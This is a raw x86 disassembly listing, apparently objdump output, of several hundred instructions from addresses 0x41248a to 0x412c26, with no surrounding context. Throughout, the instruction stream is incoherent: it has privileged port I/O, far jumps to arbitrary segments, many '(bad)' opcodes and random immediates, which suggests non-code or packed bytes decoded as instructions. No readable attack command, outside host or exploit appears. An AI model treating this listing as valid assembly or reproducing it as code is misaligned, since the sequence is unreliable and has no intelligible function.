  41248a:	jbe    0x41245a
  41248c:	cs jno 0x4124fc
  41248f:	in     al,0xda
  412491:	ret    
  412492:	and    ebx,DWORD PTR [ecx-0x48a45adc]
  412498:	lods   eax,DWORD PTR ds:[esi]
  412499:	je     0x412461
  41249b:	fwait
  41249c:	not    DWORD PTR [esi-0x3b]
  41249f:	jae    0x4124e1
  4124a1:	sbb    ah,BYTE PTR [ebp-0x5dbfd0fd]
  4124a7:	pop    ss
  4124a8:	cmp    BYTE PTR [eax],dh
  4124aa:	push   ss
  4124ab:	nop
  4124ac:	pusha  
  4124ad:	mov    esi,0xa30e80e2
  4124b2:	jno    0x4124b4
  4124b4:	fidiv  DWORD PTR [edx]
  4124b6:	mov    ebx,0x8e5f32cb
  4124bb:	in     al,0xab
  4124bd:	icebp  
  4124be:	jmp    0xe414:0xdb9847e9
  4124c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124c6:	scas   al,BYTE PTR es:[edi]
  4124c7:	xor    BYTE PTR [esp+ecx*1+0x1f],dl
  4124cb:	popf   
  4124cc:	ret    0xadef
  4124cf:	or     eax,0xad916cfc
  4124d4:	or     ah,dh
  4124d6:	xor    BYTE PTR [ebx+0x4d],bl
  4124d9:	mov    edi,ss
  4124db:	stos   DWORD PTR es:[edi],eax
  4124dc:	jl     0x41250e
  4124de:	push   ebx
  4124df:	push   cs
  4124e0:	jns    0x41246e
  4124e2:	mov    al,ds:0xfec60cc6
  4124e7:	cld    
  4124e8:	mov    ah,0x32
  4124ea:	jecxz  0x412523
  4124ec:	ja     0x412529
  4124ee:	sub    al,0xf8
  4124f0:	jl     0x412522
  4124f2:	cdq    
  4124f3:	sub    BYTE PTR [edi+eiz*8+0x32],dl
  4124f7:	adc    BYTE PTR [ecx+eiz*1-0x2114f097],dl
  4124fe:	jp     0x4124a4
  412500:	adc    eax,0x730ba1db
  412505:	mov    ebx,0x8044a42b
  41250a:	ja     0x4124c6
  41250c:	sbb    BYTE PTR [edx+esi*1-0x346c5ddd],al
  412513:	pop    esi
  412514:	test   BYTE PTR [edi+0x3bed938f],bh
  41251a:	sbb    dh,BYTE PTR [esi]
  41251c:	nop
  41251d:	xchg   bh,ah
  41251f:	jmp    0x41256c
  412521:	xchg   esp,eax
  412522:	sub    al,0x50
  412524:	imul   BYTE PTR [esi+0x7932352c]
  41252a:	xchg   ebx,eax
  41252b:	out    dx,eax
  41252c:	fsubr  st(4),st
  41252e:	jle    0x412543
  412530:	bound  edi,QWORD PTR ss:[edi]
  412533:	adc    eax,0xff2e7abd
  412538:	jecxz  0x4124ba
  41253a:	es popa 
  41253c:	mov    al,ds:0x9967b7dc
  412541:	mov    edi,0xd47ffbe1
  412546:	push   cs
  412547:	or     dh,BYTE PTR [edx-0x3f49bac1]
  41254d:	ins    DWORD PTR es:[edi],dx
  41254e:	out    dx,eax
  41254f:	inc    BYTE PTR [ecx+ebx*8+0x67]
  412553:	pop    edi
  412554:	push   ebp
  412555:	adc    al,0x3a
  412557:	xor    al,0xb3
  412559:	imul   ch
  41255b:	adc    al,BYTE PTR [ebx+0x3efb6a0a]
  412561:	push   es
  412562:	mov    al,0x1
  412564:	mov    al,0x67
  412566:	cwde   
  412567:	popa   
  412568:	add    eax,0x96dceae
  41256d:	sbb    edx,DWORD PTR [edi-0x35]
  412570:	dec    eax
  412571:	and    BYTE PTR [esi],dh
  412573:	inc    edi
  412574:	sub    ah,BYTE PTR [eax-0x21]
  412577:	je     0x412596
  412579:	sbb    eax,0x7b29f5a4
  41257e:	and    esi,esi
  412580:	stos   BYTE PTR es:[edi],al
  412581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412582:	xor    esp,DWORD PTR [ebp+0x33a519f]
  412588:	fldenv [ecx-0xf]
  41258b:	or     edi,DWORD PTR [edi+0x91adb7a]
  412591:	sbb    DWORD PTR [eax+0x655543c7],edi
  412597:	sar    BYTE PTR [edx+0x325fbf94],cl
  41259d:	cli    
  41259e:	adc    ebx,DWORD PTR [esi+0x3881bd6a]
  4125a4:	xor    dl,BYTE PTR [edx]
  4125a6:	in     eax,dx
  4125a7:	jmp    esi
  4125a9:	hlt    
  4125aa:	pop    esp
  4125ab:	loop   0x4125cd
  4125ad:	aas    
  4125ae:	sbb    DWORD PTR [edi+0x69],ebx
  4125b1:	and    eax,0xb1a1df08
  4125b6:	jnp    0x4125d2
  4125b8:	loope  0x412609
  4125ba:	sahf   
  4125bb:	mov    eax,0x76e70203
  4125c0:	and    DWORD PTR [ebx+0x52],edi
  4125c3:	mov    eax,ds:0x38f3bc4d
  4125c8:	loope  0x412608
  4125ca:	dec    ecx
  4125cb:	cmp    BYTE PTR [ecx+0x5ba3f050],dl
  4125d1:	cli    
  4125d2:	out    dx,eax
  4125d3:	fnstenv [ecx]
  4125d5:	or     BYTE PTR [edi+0x169a5331],ch
  4125db:	xchg   edx,eax
  4125dc:	retf   
  4125dd:	inc    edi
  4125de:	or     edi,ebp
  4125e0:	into   
  4125e1:	nop
  4125e2:	xor    DWORD PTR [esi+0x58],esp
  4125e5:	stos   DWORD PTR es:[edi],eax
  4125e6:	test   ecx,ecx
  4125e8:	and    DWORD PTR [edi+0x53],edx
  4125eb:	mov    cl,0x16
  4125ed:	mov    cl,BYTE PTR [ecx]
  4125ef:	retf   0x1973
  4125f2:	data16 test BYTE PTR [eax+eax*1],dh
  4125f6:	push   edx
  4125f7:	repz mul DWORD PTR [ebx]
  4125fa:	or     ch,cl
  4125fc:	sbb    ecx,ecx
  4125fe:	push   ebx
  4125ff:	loop   0x4125fe
  412601:	push   edi
  412602:	pop    esp
  412603:	xor    cl,BYTE PTR es:[edx-0x2c]
  412607:	repz mov ebp,0x20446605
  41260d:	push   esp
  41260e:	xor    eax,0xf0dcfeac
  412613:	ret    
  412614:	mov    cl,0xc3
  412616:	dec    esi
  412617:	push   esi
  412618:	int    0xb1
  41261a:	add    edi,0x8ca6d08e
  412620:	jg     0x4125ef
  412622:	jmp    0x41263d
  412624:	cs inc esp
  412626:	sbb    DWORD PTR [esp+edx*8],esp
  412629:	scas   al,BYTE PTR es:[edi]
  41262a:	dec    ebp
  41262b:	mov    dh,0xc5
  41262d:	retf   
  41262e:	or     BYTE PTR [ecx+0x1b],ch
  412631:	push   0x60f9554e
  412636:	mov    edx,0x35fb88de
  41263b:	xchg   edi,eax
  41263c:	jp     0x41264c
  41263e:	imul   ecx,DWORD PTR [esi],0xffffff98
  412641:	sar    DWORD PTR [eax-0x37],cl
  412644:	out    0x39,eax
  412646:	aam    0x58
  412648:	xchg   esp,eax
  412649:	push   ebx
  41264a:	outs   dx,BYTE PTR ds:[esi]
  41264b:	mov    ebp,0x120c7b54
  412650:	dec    ecx
  412651:	lahf   
  412652:	jnp    0x4125e6
  412654:	mov    dh,0x9a
  412656:	add    BYTE PTR [edx-0x78],bh
  412659:	mov    ch,0xff
  41265b:	rol    BYTE PTR [edi-0x12],1
  41265e:	imul   ecx,ecx,0xffffffba
  412661:	mov    edx,0xa8a83ead
  412666:	mov    ch,0xed
  412668:	es ret 0x2c5c
  41266c:	xor    ebp,DWORD PTR [ecx+ecx*4]
  41266f:	ds (bad) 
  412671:	sub    DWORD PTR gs:[eax],ebp
  412674:	jae    0x41269c
  412676:	cli    
  412677:	stos   DWORD PTR es:[edi],eax
  412678:	push   esp
  412679:	xchg   ebx,eax
  41267a:	or     DWORD PTR [edi+0x4b],esi
  41267d:	call   0x6a5fa7d6
  412682:	pop    esi
  412683:	pop    ss
  412684:	bound  ebp,QWORD PTR [edi-0x15]
  412687:	cmp    al,0x1b
  412689:	add    BYTE PTR [ecx],bh
  41268b:	jnp    0x4126e7
  41268d:	call   0x49ea:0xf283bc98
  412694:	adc    BYTE PTR [edx],dh
  412696:	cmc    
  412697:	xor    eax,0x483e3173
  41269c:	bound  ecx,QWORD PTR [edx+ebx*4-0x13]
  4126a0:	fsub   st,st(2)
  4126a2:	sbb    DWORD PTR [edi-0x523fe18],edx
  4126a8:	ret    0x31ee
  4126ab:	ins    BYTE PTR es:[edi],dx
  4126ac:	and    dl,BYTE PTR [esi]
  4126ae:	imul   ecx,esp,0x4d5f62a4
  4126b4:	ja     0x412640
  4126b6:	sub    edx,DWORD PTR [ecx-0x68548be6]
  4126bc:	lds    ebx,FWORD PTR [ebp+0x6b]
  4126bf:	sub    al,0x73
  4126c1:	pop    DWORD PTR [eax]
  4126c3:	std    
  4126c4:	cmp    eax,eax
  4126c6:	or     BYTE PTR [eax],bl
  4126c8:	retf   
  4126c9:	arpl   bp,bp
  4126cb:	pop    eax
  4126cc:	loope  0x412709
  4126ce:	jno    0x41268d
  4126d0:	xor    dh,BYTE PTR [ecx]
  4126d2:	xchg   edx,eax
  4126d3:	fidivr DWORD PTR [edi+0x21]
  4126d6:	jmp    0xc234:0xe40d2ee4
  4126dd:	ds loop 0x412686
  4126e0:	cld    
  4126e1:	and    al,0x65
  4126e3:	pop    eax
  4126e4:	jo     0x41273b
  4126e6:	mov    al,0x54
  4126e8:	add    al,0xd
  4126ea:	and    BYTE PTR [eax+0x32],bl
  4126ed:	jb     0x412752
  4126ef:	add    esi,DWORD PTR [edx-0x7]
  4126f2:	xor    DWORD PTR [ebx+edx*4-0x752b5b53],0xffffffef
  4126fa:	pusha  
  4126fb:	in     al,dx
  4126fc:	xchg   ecx,eax
  4126fd:	out    0x1f,al
  4126ff:	bound  ebp,QWORD PTR [eax]
  412701:	es inc esp
  412703:	fmul   DWORD PTR [edx]
  412705:	pop    es
  412706:	sub    eax,DWORD PTR [bp+di+0x26]
  41270a:	fcmovb st,st(5)
  41270c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41270d:	adc    eax,0x40838eed
  412712:	add    BYTE PTR [esi],bl
  412714:	and    esp,DWORD PTR [ebx+0x597d920]
  41271a:	dec    esp
  41271b:	fs xor eax,0x127090ac
  412721:	xor    eax,DWORD PTR [edx]
  412723:	push   ss
  412724:	ret    
  412725:	cmp    eax,0x7df60768
  41272a:	or     dl,ah
  41272c:	sbb    esp,DWORD PTR [ebp+0x243f2dbc]
  412732:	nop
  412733:	push   eax
  412734:	sti    
  412735:	sub    BYTE PTR [edi+0x49],dl
  412738:	xor    esi,DWORD PTR [esi+0x3f]
  41273b:	mov    dh,BYTE PTR [edi+0x13]
  41273e:	stos   BYTE PTR es:[edi],al
  41273f:	out    dx,eax
  412740:	test   BYTE PTR [ecx+0x222740b6],dh
  412746:	fisub  DWORD PTR [edx+0x1e]
  412749:	xchg   ebp,eax
  41274a:	lods   al,BYTE PTR ds:[esi]
  41274b:	and    DWORD PTR [ecx+0xa],ebx
  41274e:	test   DWORD PTR [ecx],esi
  412750:	cwde   
  412751:	add    bl,BYTE PTR [edx+0x1c32ba26]
  412757:	cs leave 
  412759:	mov    ecx,0x9ec7dd45
  41275e:	cmp    BYTE PTR [esp+eax*1],bh
  412761:	add    BYTE PTR ds:0x6494cb7a,dh
  412767:	daa    
  412768:	mov    ebx,0xd5dc27b
  41276d:	mov    DWORD PTR [edi-0x69],ebp
  412770:	sub    al,0x1a
  412772:	arpl   WORD PTR [edi],sp
  412774:	(bad)  [eax]
  412776:	jbe    0x41271c
  412778:	gs lock stc 
  41277b:	iret   
  41277c:	test   al,0x7a
  41277e:	les    eax,FWORD PTR [edi]
  412780:	dec    esp
  412781:	fisttp DWORD PTR [ebp-0x4a]
  412784:	lea    edx,[esi-0x13]
  412787:	sbb    al,0x9f
  412789:	call   0x67551a83
  41278e:	mov    dl,0xfe
  412790:	mov    ebp,0xf9a4195c
  412795:	jg     0x4127ad
  412797:	das    
  412798:	adc    eax,DWORD PTR [edx+0x23f6a0ce]
  41279e:	add    DWORD PTR [ebp-0x4add71cb],ecx
  4127a4:	pushf  
  4127a5:	std    
  4127a6:	dec    ebx
  4127a7:	pop    esi
  4127a8:	mov    esi,0xcf971f3a
  4127ad:	(bad)  
  4127ae:	jle    0x4127d7
  4127b0:	push   ebx
  4127b1:	cld    
  4127b2:	shr    BYTE PTR ds:0xb287dab4,cl
  4127b8:	outs   dx,DWORD PTR ds:[esi]
  4127b9:	push   0x3fd1cf24
  4127be:	dec    edi
  4127bf:	or     BYTE PTR [edx-0x48],cl
  4127c2:	push   edx
  4127c3:	xchg   edi,eax
  4127c4:	ins    DWORD PTR es:[edi],dx
  4127c5:	out    0xce,al
  4127c7:	stos   BYTE PTR es:[edi],al
  4127c8:	test   ch,dl
  4127ca:	aas    
  4127cb:	idiv   DWORD PTR [edx+0x68]
  4127ce:	sahf   
  4127cf:	sbb    ebp,DWORD PTR [ebx+ebp*8]
  4127d2:	pusha  
  4127d3:	xor    DWORD PTR [edx],edi
  4127d5:	mov    bl,0x8e
  4127d7:	or     ecx,DWORD PTR [ebx+0x58]
  4127da:	mov    BYTE PTR [ecx],bh
  4127dc:	sahf   
  4127dd:	push   ecx
  4127de:	mov    al,0x65
  4127e0:	ret    0x2c9a
  4127e3:	aam    0xbc
  4127e5:	adc    BYTE PTR [edi-0x1f502b94],0xd6
  4127ec:	mov    eax,ds:0x7b312110
  4127f1:	or     ah,BYTE PTR [edx]
  4127f3:	jmp    0xc475:0xc2a62da3
  4127fa:	or     ebp,DWORD PTR [eax+0x33ae6dad]
  412800:	xor    DWORD PTR [ebx],ebx
  412802:	fstp   TBYTE PTR [ebx]
  412804:	xor    al,0x63
  412806:	inc    edx
  412807:	jne    0x41283f
  412809:	sub    BYTE PTR [ebp-0x64468911],al
  41280f:	cmp    DWORD PTR [ebx-0x71],esi
  412812:	cli    
  412813:	xor    eax,DWORD PTR [esi]
  412815:	add    ecx,esi
  412817:	mov    dh,0xda
  412819:	cmc    
  41281a:	retf   
  41281b:	pop    eax
  41281c:	push   ebx
  41281d:	fsub   DWORD PTR ds:0x5f412fd3
  412823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412824:	loop   0x4127f8
  412826:	into   
  412827:	loopne 0x41280e
  412829:	lock dec ecx
  41282b:	pop    edi
  41282c:	ret    
  41282d:	in     al,dx
  41282e:	mov    dh,0x52
  412830:	rol    DWORD PTR [ecx],cl
  412832:	push   esp
  412833:	scas   al,BYTE PTR es:[edi]
  412834:	xchg   ebp,eax
  412835:	pop    esp
  412836:	jae    0x41288f
  412838:	mov    edi,0xf2faa208
  41283d:	jle    0x41282f
  41283f:	retf   
  412840:	sub    al,0xbf
  412842:	push   edi
  412843:	cmp    eax,0x91790978
  412848:	or     al,0x58
  41284a:	pop    esp
  41284b:	outs   dx,BYTE PTR ds:[esi]
  41284c:	or     DWORD PTR [ecx-0x330a7d2d],ecx
  412852:	mov    ch,0x90
  412854:	fwait
  412855:	dec    ebp
  412856:	(bad)  
  412857:	call   0x9e1:0xeb60c06f
  41285e:	jbe    0x4127e5
  412860:	fcmovu st,st(3)
  412862:	and    edi,DWORD PTR [esi]
  412864:	cwde   
  412865:	inc    esi
  412866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412867:	xchg   edx,eax
  412868:	sahf   
  412869:	lock test eax,0x4833189b
  41286f:	(bad)  [edi-0x41]
  412872:	push   edx
  412873:	idiv   BYTE PTR [edi+edi*8-0x3c]
  412877:	div    BYTE PTR [ebp+0x4929e88e]
  41287d:	jns    0x412843
  41287f:	sbb    eax,0xd60d393
  412884:	lea    ebp,[ebp+0x47c059bd]
  41288a:	mov    ebp,0xa767f232
  41288f:	inc    esi
  412890:	adc    edi,DWORD PTR [edi+0x74]
  412893:	mov    cl,0x37
  412895:	xor    ebp,DWORD PTR [ebp+0x58]
  412898:	sub    al,BYTE PTR [eax+0x2fa196ba]
  41289e:	jecxz  0x412894
  4128a0:	sub    ebp,0x9184d5a6
  4128a6:	aaa    
  4128a7:	test   al,0x3
  4128a9:	sti    
  4128aa:	ror    ch,1
  4128ac:	jmp    0x4128c1
  4128ae:	mov    ah,0xb4
  4128b0:	dec    edx
  4128b1:	xor    ebp,ebx
  4128b3:	dec    esp
  4128b4:	push   ecx
  4128b5:	xchg   edi,eax
  4128b6:	enter  0x9b92,0x46
  4128ba:	outs   dx,BYTE PTR ds:[esi]
  4128bb:	ss dec edi
  4128bd:	cmc    
  4128be:	das    
  4128bf:	mov    eax,ds:0xe457e788
  4128c4:	or     eax,0x4560e0cb
  4128c9:	dec    esp
  4128ca:	jp     0x412946
  4128cc:	loopne 0x412878
  4128ce:	outs   dx,DWORD PTR ds:[esi]
  4128cf:	mov    al,ds:0xf21a1cc6
  4128d4:	std    
  4128d5:	adc    al,0x7
  4128d7:	xchg   esp,eax
  4128d8:	or     DWORD PTR [edi],esi
  4128da:	mov    ds:0xf87a6ac2,al
  4128df:	cmp    al,bl
  4128e1:	(bad)
  4128e4:	popf   
  4128e5:	int3   
  4128e6:	ficom  DWORD PTR ds:0x942bc851
  4128ec:	std    
  4128ed:	ss cmp eax,0x57b4ebe6
  4128f3:	inc    ebx
  4128f4:	jl     0x4128c5
  4128f6:	imul   edi,DWORD PTR [ebx],0x62e62f9a
  4128fc:	ss jle 0x4128d8
  4128ff:	test   al,0x41
  412901:	scas   eax,DWORD PTR es:[edi]
  412902:	adc    eax,ebp
  412904:	dec    ecx
  412905:	imul   eax,DWORD PTR [ecx*4+0x4a43692d],0xffffff9d
  41290d:	rcl    DWORD PTR [ebx],0x27
  412910:	sar    BYTE PTR [ebp+ecx*8+0x4d],cl
  412914:	and    eax,0x75a31b79
  412919:	adc    BYTE PTR [ecx-0x22ca36e],dh
  41291f:	fnstsw WORD PTR [edi+0x60]
  412922:	enter  0xc296,0xce
  412926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412927:	pop    ss
  412928:	pop    esp
  412929:	push   cs
  41292a:	mov    ecx,eax
  41292c:	fsubrp st(1),st
  41292e:	push   ss
  41292f:	sar    BYTE PTR [edx-0xc],cl
  412932:	xor    BYTE PTR [esi],bh
  412934:	shl    DWORD PTR [eax-0x43],0x38
  412938:	fwait
  412939:	(bad)  
  41293a:	inc    eax
  41293b:	loopne 0x412926
  41293d:	push   ebp
  41293e:	mov    edx,0x5d2dfeab
  412943:	dec    edx
  412944:	ror    DWORD PTR [ebp+ecx*8+0x312c1fe8],cl
  41294b:	cdq    
  41294c:	and    eax,0x6821364e
  412951:	pop    edx
  412952:	push   ds
  412953:	dec    esi
  412954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412956:	clc    
  412957:	fwait
  412958:	cmp    eax,0xbe8e8be4
  41295d:	xchg   esp,eax
  41295e:	fincstp 
  412960:	adc    edx,DWORD PTR [ebp+edi*1-0x70]
  412964:	jle    0x41296f
  412966:	xchg   edx,eax
  412967:	repnz inc edx
  412969:	hlt    
  41296a:	imul   ecx,edx,0x8367d592
  412970:	mov    ds:0x35c600b1,al
  412975:	aaa    
  412976:	xchg   ebp,eax
  412977:	adc    BYTE PTR [ecx],bh
  412979:	idiv   DWORD PTR [edi-0x323394df]
  41297f:	sub    edx,DWORD PTR [esp+eax*8]
  412982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412983:	dec    ebx
  412984:	int    0x6e
  412986:	jo     0x412922
  412988:	out    dx,al
  412989:	push   edx
  41298a:	daa    
  41298b:	je     0x41291e
  41298d:	mov    ds:0xa4599591,eax
  412992:	mov    ch,0x6c
  412994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412995:	popa   
  412996:	or     edi,DWORD PTR es:[esi-0x7feb0a4a]
  41299d:	pop    edi
  41299e:	in     eax,dx
  41299f:	popa   
  4129a0:	mov    cl,0x75
  4129a2:	xor    ch,BYTE PTR [edi-0x13]
  4129a5:	es push ebp
  4129a7:	inc    ebx
  4129a8:	xor    al,0xec
  4129aa:	test   ebx,edx
  4129ac:	xchg   esp,eax
  4129ad:	add    eax,0xd3919157
  4129b2:	ficomp DWORD PTR [edx]
  4129b4:	(bad)  
  4129b5:	stc    
  4129b6:	and    al,0x38
  4129b8:	adc    DWORD PTR [edi+edx*2],ebx
  4129bb:	jmp    0x2597642f
  4129c0:	daa    
  4129c1:	cmp    al,cl
  4129c3:	mov    ah,0x12
  4129c5:	stos   BYTE PTR es:[edi],al
  4129c6:	(bad)  
  4129c7:	inc    DWORD PTR [edx+0x7fe3fc7f]
  4129cd:	cmp    al,0x86
  4129cf:	nop
  4129d0:	mov    al,0x9c
  4129d2:	add    ebx,DWORD PTR ds:0x5fe7d21e
  4129d8:	dec    edx
  4129d9:	cs jnp 0x412a23
  4129dc:	inc    esp
  4129dd:	cmp    ebx,eax
  4129df:	push   edi
  4129e0:	test   DWORD PTR [eax+edi*2],0xd24e0636
  4129e7:	xor    BYTE PTR [eax+0x28fb00f9],ah
  4129ed:	pop    ds
  4129ee:	rcl    BYTE PTR [ecx],cl
  4129f0:	loope  0x412a53
  4129f2:	jmp    0x412a50
  4129f4:	sti    
  4129f5:	and    BYTE PTR [edi+0x13],0xc1
  4129f9:	test   BYTE PTR [eax+ecx*4-0x9],ah
  4129fd:	lock mov ch,0x9a
  412a00:	mov    esi,0x63120dc
  412a05:	(bad)  
  412a06:	out    0xd7,eax
  412a08:	mov    bh,0x61
  412a0a:	ficomp WORD PTR [bp+si-0x9]
  412a0e:	jno    0x41299a
  412a10:	sbb    bl,BYTE PTR [edi+0x46]
  412a13:	popf   
  412a14:	imul   eax,DWORD PTR [ecx],0xb816832a
  412a1a:	int3   
  412a1b:	dec    esp
  412a1c:	out    dx,eax
  412a1d:	push   eax
  412a1e:	js     0x412a69
  412a20:	sub    BYTE PTR [edx-0x6f],0x71
  412a24:	inc    esp
  412a25:	nop
  412a26:	sbb    BYTE PTR [edi-0x2c97ede8],ch
  412a2c:	fisttp DWORD PTR [ebx]
  412a2e:	or     ebp,esp
  412a30:	mov    bh,bl
  412a32:	sar    DWORD PTR [ecx+ebp*4],1
  412a35:	data16 outs dx,BYTE PTR ds:[esi]
  412a37:	push   edx
  412a38:	lods   eax,DWORD PTR ds:[esi]
  412a39:	adc    ebx,ecx
  412a3b:	cs out 0x66,al
  412a3e:	out    0xfc,al
  412a40:	xchg   esi,eax
  412a41:	fidiv  WORD PTR [ebp-0x68]
  412a44:	cmp    dh,bh
  412a46:	fnstcw WORD PTR [edi]
  412a48:	mov    cl,0x74
  412a4a:	stos   BYTE PTR es:[edi],al
  412a4b:	aad    0xd8
  412a4d:	lds    esi,FWORD PTR [edx-0x1a]
  412a50:	repz scas eax,DWORD PTR es:[edi]
  412a52:	cwde   
  412a53:	mov    ebp,0xaa680bde
  412a58:	fbld   TBYTE PTR [ebx-0x6123a0c2]
  412a5e:	mov    es,ecx
  412a60:	xchg   esi,eax
  412a61:	jmp    0x73ea:0x60ab9702
  412a68:	sahf   
  412a69:	jle    0x412aac
  412a6b:	ins    DWORD PTR es:[edi],dx
  412a6c:	mov    eax,ds:0x8c5b9da3
  412a71:	ins    DWORD PTR es:[edi],dx
  412a72:	push   0x79
  412a74:	lods   eax,DWORD PTR ds:[esi]
  412a75:	aad    0x2e
  412a77:	(bad)
  412a7a:	push   edi
  412a7b:	xor    eax,esp
  412a7d:	mov    ebx,DWORD PTR [esi-0x4f]
  412a80:	mov    ch,0xb5
  412a82:	(bad)  
  412a83:	cld    
  412a84:	sbb    eax,0x92675526
  412a89:	mov    cl,0x2d
  412a8b:	sub    DWORD PTR [edx+0xf],ecx
  412a8e:	sub    al,0xd9
  412a90:	adc    al,0xb2
  412a92:	test   esp,esp
  412a94:	mov    WORD PTR [esi],gs
  412a96:	and    edx,DWORD PTR [ebx-0x29]
  412a99:	jbe    0x412b02
  412a9b:	(bad)  
  412a9c:	push   ebp
  412a9d:	adc    BYTE PTR [edi-0x4ce37cce],al
  412aa3:	push   ss
  412aa4:	sub    BYTE PTR [eax],ch
  412aa6:	xor    eax,0x7196cbf1
  412aab:	mov    ecx,DWORD PTR [edx+0x30]
  412aae:	inc    edx
  412aaf:	mov    esp,0x44f052ed
  412ab4:	mov    dl,BYTE PTR [edx-0x1e]
  412ab7:	sbb    ebx,0xffffffa3
  412aba:	shr    BYTE PTR [eax-0x6],1
  412abd:	xor    al,dl
  412abf:	push   ds
  412ac0:	loope  0x412ae5
  412ac2:	(bad)  
  412ac3:	xor    DWORD PTR [esp+eiz*8+0x5d7ba0eb],ebp
  412aca:	call   0xd7be4ccf
  412acf:	sahf   
  412ad0:	sub    BYTE PTR [ebp-0x5],dl
  412ad3:	or     ch,BYTE PTR [ebx]
  412ad5:	loopne 0x412ae4
  412ad7:	mov    cl,cl
  412ad9:	scas   al,BYTE PTR es:[edi]
  412ada:	push   0x7c
  412adc:	jns    0x412af2
  412ade:	(bad)  
  412adf:	xchg   esi,eax
  412ae0:	int3   
  412ae1:	test   ecx,0x336bb764
  412ae7:	aad    0x1a
  412ae9:	cmp    eax,0x7d167483
  412aee:	(bad)  
  412aef:	aam    0x61
  412af1:	loope  0x412b59
  412af3:	sbb    eax,0xef4bd591
  412af8:	call   0x6305:0xd60a3e4e
  412aff:	sar    BYTE PTR [ebp-0x7c29273a],0x2e
  412b06:	mov    al,ds:0xe16962ad
  412b0b:	cmp    BYTE PTR [esi+0x7c],al
  412b0e:	push   esp
  412b0f:	pop    es
  412b10:	js     0x412b8e
  412b12:	or     al,0xa
  412b14:	pop    ebx
  412b15:	mov    ds:0x23136cf4,eax
  412b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b1b:	jmp    0xb143:0xc2d7e9c9
  412b22:	ins    DWORD PTR es:[edi],dx
  412b23:	push   ss
  412b24:	mov    ss,edi
  412b26:	add    BYTE PTR [ecx+ebx*8+0x22],ch
  412b2a:	bound  eax,QWORD PTR [ebx+0x33]
  412b2d:	inc    ebp
  412b2e:	fistp  QWORD PTR [esi]
  412b30:	xor    ah,BYTE PTR ds:0x816e0281
  412b36:	jne    0x412b1a
  412b38:	sbb    ecx,DWORD PTR [ecx-0x5b]
  412b3b:	xor    BYTE PTR [edi],bh
  412b3d:	test   al,0x14
  412b3f:	mov    ch,0x15
  412b41:	shr    DWORD PTR [ebx+0x1c58194b],1
  412b47:	pop    edi
  412b48:	mov    ds:0x6543044e,al
  412b4d:	scas   eax,DWORD PTR es:[edi]
  412b4e:	xchg   BYTE PTR [edx],ah
  412b50:	mov    al,ds:0x97ab3310
  412b55:	in     eax,dx
  412b56:	or     DWORD PTR [ecx],edx
  412b58:	outs   dx,DWORD PTR ds:[esi]
  412b59:	and    esp,esi
  412b5b:	jno    0x412bb7
  412b5d:	fld    TBYTE PTR [ebx+0x17]
  412b60:	pop    ebp
  412b61:	sub    DWORD PTR [esi],esp
  412b63:	xor    al,0x18
  412b65:	popf   
  412b66:	add    DWORD PTR [edx+0x38],0xfb11f71f
  412b6d:	mov    eax,ds:0xb0e8b047
  412b72:	inc    esp
  412b73:	hlt    
  412b74:	iret   
  412b75:	pop    ebx
  412b76:	cli    
  412b77:	pop    ss
  412b78:	or     esi,eax
  412b7a:	push   0x76
  412b7c:	push   es
  412b7d:	add    al,BYTE PTR [ecx-0x7c3c1e0f]
  412b83:	imul   ebx,DWORD PTR [ebx],0xfffffffb
  412b86:	inc    ebx
  412b87:	mov    dh,0x25
  412b89:	ds add al,dh
  412b8c:	(bad)  
  412b8e:	lods   al,BYTE PTR ds:[esi]
  412b8f:	inc    esi
  412b90:	aas    
  412b91:	sub    DWORD PTR [esi],ebp
  412b93:	lods   eax,DWORD PTR ds:[esi]
  412b94:	sub    ebx,DWORD PTR [esi+0x58]
  412b97:	idiv   ah
  412b99:	test   eax,0xcf3b61b9
  412b9e:	jl     0x412b54
  412ba0:	lds    edx,FWORD PTR [edi]
  412ba2:	sbb    bl,BYTE PTR [esi]
  412ba4:	(bad)
  412ba7:	sbb    ebp,DWORD PTR [edx]
  412ba9:	jb     0x412bca
  412bab:	outs   dx,DWORD PTR ds:[esi]
  412bac:	or     al,0x87
  412bae:	cmp    BYTE PTR [ebx+edx*1-0x6140b622],dl
  412bb5:	mov    ah,0xe8
  412bb7:	jb     0x412c17
  412bb9:	loope  0x412bb8
  412bbb:	adc    DWORD PTR [edi+0x31],esp
  412bbe:	inc    eax
  412bbf:	ret    
  412bc0:	pop    ebx
  412bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bc2:	aaa    
  412bc3:	data16 mov BYTE PTR [esi+ebx*8-0x273fba20],bl
  412bcb:	fdivr  QWORD PTR [esi+0xf]
  412bce:	sub    al,BYTE PTR [ebx+ebp*4+0x1e706c80]
  412bd5:	mov    edx,0x7d541dd1
  412bda:	in     al,dx
  412bdb:	xor    eax,0x6384f987
  412be0:	and    al,BYTE PTR [ebp+0x36]
  412be3:	jmp    0x412c43
  412be5:	(bad)  [ebx+0x64b75505]
  412beb:	adc    al,BYTE PTR [edx]
  412bed:	add    al,0x63
  412bef:	rol    ecx,1
  412bf1:	iret   
  412bf2:	(bad)  
  412bf3:	bnd jmp 0x34c380f3
  412bf9:	sub    DWORD PTR [eax-0x7904bb1e],ecx
  412bff:	jb     0x412c06
  412c01:	mov    ds:0xebc49349,eax
  412c06:	push   ebx
  412c07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c08:	cld    
  412c09:	fcmovnbe st,st(6)
  412c0b:	retf   0xe59d
  412c0e:	add    DWORD PTR [eax],esp
  412c10:	outs   dx,BYTE PTR ds:[esi]
  412c11:	(bad)  
  412c12:	mov    eax,0x9d8c304f
  412c17:	outs   dx,BYTE PTR ds:[esi]
  412c18:	sub    BYTE PTR [ebx],bh
  412c1a:	add    eax,DWORD PTR [ebx-0x10]
  412c1d:	nop
  412c1e:	jp     0x412c84
  412c20:	cwde   
  412c21:	pop    ebp
  412c22:	mov    al,0x5a
  412c24:	sbb    al,ch
  412c26:	or     ebp,DWORD PTR [edi]
